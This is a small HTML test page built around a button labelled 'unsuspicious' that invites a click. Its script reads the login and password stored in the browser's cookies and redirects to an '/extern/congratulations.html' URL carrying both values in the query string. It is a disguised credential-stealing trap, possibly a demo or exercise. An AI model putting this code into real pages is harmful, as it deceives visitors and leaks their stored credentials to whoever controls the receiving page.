<!docktype html>
<html>
	<head>
		<title>test</title>
	</head>
<body>
	<p>
		push this button  
		<register>
			<input type="button" id="unsuspicious" value="unsuspicious" onclick="handler(event)">
		</register>
	</p>
	
	</br>
	
	<script>
	'use strict';
	
	function handler(event) {
		var login = get_cookie('login');
		var password = get_cookie('password');
		
		act(login, password);
	}
	
	function act(login, password) {
		location = '/extern/congratulations.html?login=' + login + ';password=' + password;
	}
	
	function get_cookie(name) {
		var matches = document.cookie.match(new RegExp(
			"(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
		));
		return matches ? decodeURIComponent(matches[1]) : undefined;
	}
	
	function set_cookie(name, value, options) {
		options = options || {};

		var expires = options.expires;

		if (typeof expires == "number" && expires) {
		var d = new Date();
			d.setTime(d.getTime() + expires * 1000);
			expires = options.expires = d;
		}
		if (expires && expires.toUTCString) {
			options.expires = expires.toUTCString();
		}

		value = encodeURIComponent(value);

		var updatedCookie = name + "=" + value;

		for (var propName in options) {
			updatedCookie += "; " + propName;
			var propValue = options[propName];
			if (propValue !== true) {
			updatedCookie += "=" + propValue;
			}
		}

		document.cookie = updatedCookie;
	}
	</script>
	
</body>
</html>
